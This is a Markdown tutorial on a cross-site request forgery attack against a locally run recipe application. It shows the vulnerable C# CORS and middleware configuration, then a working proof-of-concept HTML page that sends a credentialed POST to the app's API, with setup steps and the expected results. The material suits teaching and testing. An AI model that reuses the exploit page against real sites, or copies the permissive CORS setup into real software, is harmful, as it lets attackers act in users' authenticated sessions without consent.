# CSRF Exploitation Tutorial: Recipe API Attack
---

## What is CSRF?

**Cross-Site Request Forgery (CSRF)** is an attack that forces authenticated users to execute unwanted actions on a web application. The attacker tricks the victim's browser into making requests to a vulnerable application where the victim is authenticated.

### How CSRF Works

```
┌─────────┐                    ┌──────────────┐                  ┌─────────────┐
│ Victim  │                    │   Attacker   │                  │ Vulnerable  │
│ Browser │                    │   Website    │                  │     API     │
└────┬────┘                    └──────┬───────┘                  └──────┬──────┘
     │                                │                                 │
     │  1. Visit attacker site        │                                 │
     │───────────────────────────────>│                                 │
     │                                │                                 │
     │  2. Malicious HTML/JS          │                                 │
     │<───────────────────────────────│                                 │
     │                                │                                 │
     │  3. Browser executes attack    │                                 │
     │  (sends authenticated request) │                                 │
     │────────────────────────────────────────────────────────────────>│
     │                                │                                 │
     │  4. API processes request      │                                 │
     │  (using victim's session)      │                                 │
     │<────────────────────────────────────────────────────────────────│
```

### Key Requirements for CSRF
1. ✅ User must be authenticated on the target application
2. ✅ Application must rely solely on cookies/session for authentication
3. ✅ No CSRF protection mechanisms (anti-forgery tokens)
4. ✅ Attacker can craft a valid request

---

## Vulnerability Analysis

### 1. Missing CSRF Protection in API

**File: `Program.cs` (API)**

```csharp
var app = builder.Build();
app.UseStaticFiles();

// ❌ NO Anti-Forgery middleware
// ❌ NO CSRF token validation

app.UseHttpsRedirection();
app.MapControllers();
```

**Problem:** The API has no CSRF defense mechanisms. It blindly trusts any authenticated request.

### 2. Overly Permissive CORS Configuration

**File: `Program.cs` (BFF)**

```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.SetIsOriginAllowed(origin =>
            {
                // ❌ Accepts ANY localhost origin
                if (origin.StartsWith("http://localhost") ||
                    origin.StartsWith("http://127.0.0.1"))
                {
                    return true;
                }
                // ...
            })
            .AllowAnyMethod()      // ❌ Allows POST, PUT, DELETE
            .AllowAnyHeader()      // ❌ Allows any custom headers
            .AllowCredentials();   // ❌ Sends cookies with requests
    });
});
```

**Problems:**
- `AllowCredentials()` + permissive origins = CSRF vulnerability
- Allows requests from ANY localhost port (including attacker's port 8888)
- No validation of request origin

### 3. Cookie-Based Authentication

**File: `Program.cs` (BFF)**

```csharp
builderContext.AddRequestTransform(async transformContext =>
{
    var httpContext = transformContext.HttpContext;
    if (httpContext.User.Identity?.IsAuthenticated == true)
    {
        var token = httpContext.User.FindFirst("access_token")?.Value;
        if (!string.IsNullOrEmpty(token))
        {
            // Token from cookie/session is automatically forwarded
            transformContext.ProxyRequest.Headers.Authorization =
                new AuthenticationHeaderValue("Bearer", token);
        }
    }
});
```

**Problem:** The BFF reads the access token from the user's session/cookie, meaning the browser automatically sends credentials with cross-origin requests.

---

## Understanding the PoC

Let's break down the attack HTML file:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>CSRF Attack - Create Recipe</h1>
    <p>Executing attack...</p>
    <div id="result" class="result">Waiting for response...</div>
    
    <script>
        // 1. Create AJAX request
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost:4200/api/recipes", true);
        
        // 2. CRITICAL: Send cookies with request
        xhr.withCredentials = true; 
        
        // 3. Set content type
        xhr.setRequestHeader("Content-Type", "application/json");
        
        // 4. Handle response
        xhr.onload = function() {
            document.getElementById("result").innerHTML =                 
                "<p><strong>Status:</strong> " + xhr.status + "</p>" +
                "<p><strong>Response:</strong></p><pre>" + 
                xhr.responseText + "</pre>";                
        };
        
        // 5. Send malicious payload
        xhr.send(JSON.stringify({
            name: "CSRF Attack Recipe",
            description: "<p><strong>This recipe was created by a CSRF attack!</strong></p>",
            status: 1,
            photo: "",
            createdBy: ""
        }));
    </script>
</body>
</html>
```

### Attack Breakdown

| Component | Purpose |
|-----------|---------|
| `xhr.withCredentials = true` | Browser sends authentication cookies |
| Target URL | `http://localhost:4200/api/recipes` (the BFF endpoint) |
| Method | `POST` - creates a new recipe |
| Payload | Malicious recipe data in JSON format |
| Auto-execution | JavaScript runs immediately when page loads |

---

## Step-by-Step Exploitation

### Prerequisites
1. Victim must be logged into the Recipe application (localhost:4200)
2. Attacker hosts the malicious HTML on a different origin (e.g., localhost:8888)

### Attack Scenario

**Step 1: Victim Authenticates**
```
Victim visits: http://localhost:4200
Victim logs in successfully
Browser stores authentication cookie/session
```

**Step 2: Attacker Prepares**
```
Attacker creates malicious HTML file (csrf-attack.html)
Attacker hosts it on: http://localhost:8888/csrf-attack.html
```

**Step 3: Victim is Tricked**
```
Attacker sends victim a link: http://localhost:8888/csrf-attack.html
Victim clicks the link (while still authenticated to localhost:4200)
```

**Step 4: Attack Executes**
```
Browser loads attacker's page
JavaScript automatically executes
XHR request sent to http://localhost:4200/api/recipes
Browser includes victim's authentication cookies (withCredentials: true)
BFF forwards request to API with victim's token
API creates malicious recipe under victim's account
```

**Step 5: Impact**
```
Malicious recipe created successfully
Victim's account now contains attacker's content
Attacker could have done much worse (delete all recipes, modify sensitive data, etc.)
```

---

## Testing the Attack

### Setup Instructions

**1. Start the Vulnerable Application**
```bash
# Terminal 1: Start the API
cd Recipes.Api
dotnet run

# Terminal 2: Start the BFF
cd Recipes.Bff
dotnet run

# API should be on: http://localhost:5000
# BFF should be on: http://localhost:4200
```

**2. Authenticate as a Victim**
```bash
# Open browser
# Navigate to: http://localhost:4200
# Log in with valid credentials
# Verify you can create recipes normally
```

**3. Host the Attack Page**
```bash
# Terminal 3: Simple HTTP server
cd /path/to/attack/files
python3 -m http.server 8888

# Attack page available at: http://localhost:8888/csrf-attack.html
```

**4. Execute the Attack**
```
In the same browser (where you're logged in):
1. Navigate to: http://localhost:8888/csrf-attack.html
2. Watch the page execute the attack
3. Check http://localhost:4200/recipes
4. Confirm the malicious recipe was created
```

### Expected Results

**Successful Attack:**
```
Status: 200 OK
Response: { "id": 123, "name": "CSRF Attack Recipe", ... }
```

**Check the Recipes Page:**
```
You should see a new recipe titled "CSRF Attack Recipe"
The description will contain the attack message
This was created without your knowledge or consent
```
---

